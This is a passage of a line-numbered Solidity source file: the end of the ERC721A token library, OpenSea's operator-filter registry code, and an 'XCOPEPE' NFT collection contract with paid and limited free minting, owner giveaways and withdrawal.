1048                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1049             );
1050 
1051             uint256 toMasked;
1052             uint256 end = startTokenId + quantity;
1053 
1054             // Use assembly to loop and emit the `Transfer` event for gas savings.
1055             // The duplicated `log4` removes an extra check and reduces stack juggling.
1056             // The assembly, together with the surrounding Solidity code, have been
1057             // delicately arranged to nudge the compiler into producing optimized opcodes.
1058             assembly {
1059                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1060                 toMasked := and(to, _BITMASK_ADDRESS)
1061                 // Emit the `Transfer` event.
1062                 log4(
1063                     0, // Start of data (0, since no data).
1064                     0, // End of data (0, since no data).
1065                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1066                     0, // `address(0)`.
1067                     toMasked, // `to`.
1068                     startTokenId // `tokenId`.
1069                 )
1070 
1071                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1072                 // that overflows uint256 will make the loop run out of gas.
1073                 // The compiler will optimize the `iszero` away for performance.
1074                 for {
1075                     let tokenId := add(startTokenId, 1)
1076                 } iszero(eq(tokenId, end)) {
1077                     tokenId := add(tokenId, 1)
1078                 } {
1079                     // Emit the `Transfer` event. Similar to above.
1080                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1081                 }
1082             }
1083             if (toMasked == 0) revert MintToZeroAddress();
1084 
1085             _currentIndex = end;
1086         }
1087         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1088     }
1089 
1090     /**
1091      * @dev Mints `quantity` tokens and transfers them to `to`.
1092      *
1093      * This function is intended for efficient minting only during contract creation.
1094      *
1095      * It emits only one {ConsecutiveTransfer} as defined in
1096      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1097      * instead of a sequence of {Transfer} event(s).
1098      *
1099      * Calling this function outside of contract creation WILL make your contract
1100      * non-compliant with the ERC721 standard.
1101      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1102      * {ConsecutiveTransfer} event is only permissible during contract creation.
1103      *
1104      * Requirements:
1105      *
1106      * - `to` cannot be the zero address.
1107      * - `quantity` must be greater than 0.
1108      *
1109      * Emits a {ConsecutiveTransfer} event.
1110      */
1111     function _mintERC2309(address to, uint256 quantity) internal virtual {
1112         uint256 startTokenId = _currentIndex;
1113         if (to == address(0)) revert MintToZeroAddress();
1114         if (quantity == 0) revert MintZeroQuantity();
1115         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1116 
1117         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1118 
1119         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1120         unchecked {
1121             // Updates:
1122             // - `balance += quantity`.
1123             // - `numberMinted += quantity`.
1124             //
1125             // We can directly add to the `balance` and `numberMinted`.
1126             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1127 
1128             // Updates:
1129             // - `address` to the owner.
1130             // - `startTimestamp` to the timestamp of minting.
1131             // - `burned` to `false`.
1132             // - `nextInitialized` to `quantity == 1`.
1133             _packedOwnerships[startTokenId] = _packOwnershipData(
1134                 to,
1135                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1136             );
1137 
1138             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1139 
1140             _currentIndex = startTokenId + quantity;
1141         }
1142         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1143     }
1144 
1145     /**
1146      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1147      *
1148      * Requirements:
1149      *
1150      * - If `to` refers to a smart contract, it must implement
1151      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1152      * - `quantity` must be greater than 0.
1153      *
1154      * See {_mint}.
1155      *
1156      * Emits a {Transfer} event for each mint.
1157      */
1158     function _safeMint(
1159         address to,
1160         uint256 quantity,
1161         bytes memory _data
1162     ) internal virtual {
1163         _mint(to, quantity);
1164 
1165         unchecked {
1166             if (to.code.length != 0) {
1167                 uint256 end = _currentIndex;
1168                 uint256 index = end - quantity;
1169                 do {
1170                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1171                         revert TransferToNonERC721ReceiverImplementer();
1172                     }
1173                 } while (index < end);
1174                 // Reentrancy protection.
1175                 if (_currentIndex != end) revert();
1176             }
1177         }
1178     }
1179 
1180     /**
1181      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1182      */
1183     function _safeMint(address to, uint256 quantity) internal virtual {
1184         _safeMint(to, quantity, '');
1185     }
1186 
1187     // =============================================================
1188     //                        BURN OPERATIONS
1189     // =============================================================
1190 
1191     /**
1192      * @dev Equivalent to `_burn(tokenId, false)`.
1193      */
1194     function _burn(uint256 tokenId) internal virtual {
1195         _burn(tokenId, false);
1196     }
1197 
1198     /**
1199      * @dev Destroys `tokenId`.
1200      * The approval is cleared when the token is burned.
1201      *
1202      * Requirements:
1203      *
1204      * - `tokenId` must exist.
1205      *
1206      * Emits a {Transfer} event.
1207      */
1208     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1209         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1210 
1211         address from = address(uint160(prevOwnershipPacked));
1212 
1213         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1214 
1215         if (approvalCheck) {
1216             // The nested ifs save around 20+ gas over a compound boolean condition.
1217             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1218                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1219         }
1220 
1221         _beforeTokenTransfers(from, address(0), tokenId, 1);
1222 
1223         // Clear approvals from the previous owner.
1224         assembly {
1225             if approvedAddress {
1226                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1227                 sstore(approvedAddressSlot, 0)
1228             }
1229         }
1230 
1231         // Underflow of the sender's balance is impossible because we check for
1232         // ownership above and the recipient's balance can't realistically overflow.
1233         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1234         unchecked {
1235             // Updates:
1236             // - `balance -= 1`.
1237             // - `numberBurned += 1`.
1238             //
1239             // We can directly decrement the balance, and increment the number burned.
1240             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1241             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1242 
1243             // Updates:
1244             // - `address` to the last owner.
1245             // - `startTimestamp` to the timestamp of burning.
1246             // - `burned` to `true`.
1247             // - `nextInitialized` to `true`.
1248             _packedOwnerships[tokenId] = _packOwnershipData(
1249                 from,
1250                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1251             );
1252 
1253             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1254             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1255                 uint256 nextTokenId = tokenId + 1;
1256                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1257                 if (_packedOwnerships[nextTokenId] == 0) {
1258                     // If the next slot is within bounds.
1259                     if (nextTokenId != _currentIndex) {
1260                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1261                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1262                     }
1263                 }
1264             }
1265         }
1266 
1267         emit Transfer(from, address(0), tokenId);
1268         _afterTokenTransfers(from, address(0), tokenId, 1);
1269 
1270         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1271         unchecked {
1272             _burnCounter++;
1273         }
1274     }
1275 
1276     // =============================================================
1277     //                     EXTRA DATA OPERATIONS
1278     // =============================================================
1279 
1280     /**
1281      * @dev Directly sets the extra data for the ownership data `index`.
1282      */
1283     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1284         uint256 packed = _packedOwnerships[index];
1285         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1286         uint256 extraDataCasted;
1287         // Cast `extraData` with assembly to avoid redundant masking.
1288         assembly {
1289             extraDataCasted := extraData
1290         }
1291         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1292         _packedOwnerships[index] = packed;
1293     }
1294 
1295     /**
1296      * @dev Called during each token transfer to set the 24bit `extraData` field.
1297      * Intended to be overridden by the cosumer contract.
1298      *
1299      * `previousExtraData` - the value of `extraData` before transfer.
1300      *
1301      * Calling conditions:
1302      *
1303      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1304      * transferred to `to`.
1305      * - When `from` is zero, `tokenId` will be minted for `to`.
1306      * - When `to` is zero, `tokenId` will be burned by `from`.
1307      * - `from` and `to` are never both zero.
1308      */
1309     function _extraData(
1310         address from,
1311         address to,
1312         uint24 previousExtraData
1313     ) internal view virtual returns (uint24) {}
1314 
1315     /**
1316      * @dev Returns the next extra data for the packed ownership data.
1317      * The returned result is shifted into position.
1318      */
1319     function _nextExtraData(
1320         address from,
1321         address to,
1322         uint256 prevOwnershipPacked
1323     ) private view returns (uint256) {
1324         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1325         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1326     }
1327 
1328     // =============================================================
1329     //                       OTHER OPERATIONS
1330     // =============================================================
1331 
1332     /**
1333      * @dev Returns the message sender (defaults to `msg.sender`).
1334      *
1335      * If you are writing GSN compatible contracts, you need to override this function.
1336      */
1337     function _msgSenderERC721A() internal view virtual returns (address) {
1338         return msg.sender;
1339     }
1340 
1341     /**
1342      * @dev Converts a uint256 to its ASCII string decimal representation.
1343      */
1344     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1345         assembly {
1346             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1347             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1348             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1349             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1350             let m := add(mload(0x40), 0xa0)
1351             // Update the free memory pointer to allocate.
1352             mstore(0x40, m)
1353             // Assign the `str` to the end.
1354             str := sub(m, 0x20)
1355             // Zeroize the slot after the string.
1356             mstore(str, 0)
1357 
1358             // Cache the end of the memory to calculate the length later.
1359             let end := str
1360 
1361             // We write the string from rightmost digit to leftmost digit.
1362             // The following is essentially a do-while loop that also handles the zero case.
1363             // prettier-ignore
1364             for { let temp := value } 1 {} {
1365                 str := sub(str, 1)
1366                 // Write the character to the pointer.
1367                 // The ASCII index of the '0' character is 48.
1368                 mstore8(str, add(48, mod(temp, 10)))
1369                 // Keep dividing `temp` until zero.
1370                 temp := div(temp, 10)
1371                 // prettier-ignore
1372                 if iszero(temp) { break }
1373             }
1374 
1375             let length := sub(end, str)
1376             // Move the pointer 32 bytes leftwards to make room for the length.
1377             str := sub(str, 0x20)
1378             // Store the length.
1379             mstore(str, length)
1380         }
1381     }
1382 }
1383 
1384 
1385 interface IOperatorFilterRegistry {
1386     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1387     function register(address registrant) external;
1388     function registerAndSubscribe(address registrant, address subscription) external;
1389     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1390     function unregister(address addr) external;
1391     function updateOperator(address registrant, address operator, bool filtered) external;
1392     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1393     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1394     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1395     function subscribe(address registrant, address registrantToSubscribe) external;
1396     function unsubscribe(address registrant, bool copyExistingEntries) external;
1397     function subscriptionOf(address addr) external returns (address registrant);
1398     function subscribers(address registrant) external returns (address[] memory);
1399     function subscriberAt(address registrant, uint256 index) external returns (address);
1400     function copyEntriesOf(address registrant, address registrantToCopy) external;
1401     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1402     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1403     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1404     function filteredOperators(address addr) external returns (address[] memory);
1405     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1406     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1407     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1408     function isRegistered(address addr) external returns (bool);
1409     function codeHashOf(address addr) external returns (bytes32);
1410 }
1411 
1412 
1413 /**
1414  * @title  OperatorFilterer
1415  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1416  *         registrant's entries in the OperatorFilterRegistry.
1417  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1418  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1419  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1420  */
1421 abstract contract OperatorFilterer {
1422     error OperatorNotAllowed(address operator);
1423 
1424     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1425         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1426 
1427     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1428         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1429         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1430         // order for the modifier to filter addresses.
1431         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1432             if (subscribe) {
1433                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1434             } else {
1435                 if (subscriptionOrRegistrantToCopy != address(0)) {
1436                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1437                 } else {
1438                     OPERATOR_FILTER_REGISTRY.register(address(this));
1439                 }
1440             }
1441         }
1442     }
1443 
1444     modifier onlyAllowedOperator(address from) virtual {
1445         // Check registry code length to facilitate testing in environments without a deployed registry.
1446         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1447             // Allow spending tokens from addresses with balance
1448             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1449             // from an EOA.
1450             if (from == msg.sender) {
1451                 _;
1452                 return;
1453             }
1454             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1455                 revert OperatorNotAllowed(msg.sender);
1456             }
1457         }
1458         _;
1459     }
1460 
1461     modifier onlyAllowedOperatorApproval(address operator) virtual {
1462         // Check registry code length to facilitate testing in environments without a deployed registry.
1463         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1464             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1465                 revert OperatorNotAllowed(operator);
1466             }
1467         }
1468         _;
1469     }
1470 }
1471 
1472 /**
1473  * @title  DefaultOperatorFilterer
1474  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1475  */
1476 abstract contract TheOperatorFilterer is OperatorFilterer {
1477     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1478 
1479     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1480 }
1481 
1482 
1483 contract XCOPEPE is ERC721A, TheOperatorFilterer {
1484     // opensea
1485     address constant DEFAULT_SUBSCRIPTIONS = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1486 
1487     //uriSuffix
1488     string public uriSuffix;
1489 
1490     // owner
1491     address public owner;
1492 
1493     // maxSupply
1494     uint256 public maxSupply;
1495 
1496     // mint price
1497     uint256 public price;
1498 
1499     // entry per addr
1500     uint256 public maxFreeNumerAddr = 1;
1501 
1502     mapping(address => uint256) _numForFree;
1503 
1504     mapping(uint256 => uint256) _numMinted;
1505 
1506     uint256 private maxPerTx;
1507 
1508     function mint(uint256 amount) payable public {
1509         require(totalSupply() + amount <= maxSupply);
1510         if (msg.value == 0) {
1511             mintinternal(amount);
1512             return;
1513         } 
1514         require(amount <= maxPerTx);
1515         require(msg.value >= amount * price);
1516         _safeMint(msg.sender, amount);
1517     }
1518 
1519     function mintinternal(uint256 amount) internal {
1520         require(amount == 1 
1521             && _numMinted[block.number] < getFreeNum() 
1522             && _numForFree[tx.origin] < maxFreeNumerAddr );
1523             _numForFree[tx.origin]++;
1524             _numMinted[block.number]++;
1525         _safeMint(msg.sender, 1);
1526     }
1527 
1528     function giveaway(address rec, uint256 amount) public onlyOwner {
1529         _safeMint(rec, amount);
1530     }
1531     
1532     modifier onlyOwner {
1533         require(owner == msg.sender);
1534         _;
1535     }
1536 
1537     constructor() ERC721A("XCOPE PE", "XCOPEPE") {
1538         owner = msg.sender;
1539         maxPerTx = 6;
1540         price = 0.002 ether;
1541         maxSupply = 666;
1542     }
1543 
1544     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1545         return string(abi.encodePacked("ipfs://bafybeihh4wnjgldwpcnzf7cibezgo7ivvyfil5nm45blo2k42bz4njnfau/", _toString(tokenId), ".json"));
1546     }
1547 
1548     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1549         maxFreeNumerAddr = maxTx;
1550     }
1551 
1552     function getFreeNum() internal returns (uint256){
1553         return (maxSupply - totalSupply()) / 16;
1554     }
1555 
1556     function withdraw() external onlyOwner {
1557         payable(msg.sender).transfer(address(this).balance);
1558     }
1559 
1560     /////////////////////////////
1561     // OPENSEA FILTER REGISTRY 
1562     /////////////////////////////
1563 
1564     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1565         super.setApprovalForAll(operator, approved);
1566     }
1567 
1568     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1569         super.approve(operator, tokenId);
1570     }
1571 
1572     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1573         super.transferFrom(from, to, tokenId);
1574     }
1575 
1576     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1577         super.safeTransferFrom(from, to, tokenId);
1578     }
1579 
1580     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1581         public
1582         payable
1583         override
1584         onlyAllowedOperator(from)
1585     {
1586         super.safeTransferFrom(from, to, tokenId, data);
1587     }
1588 }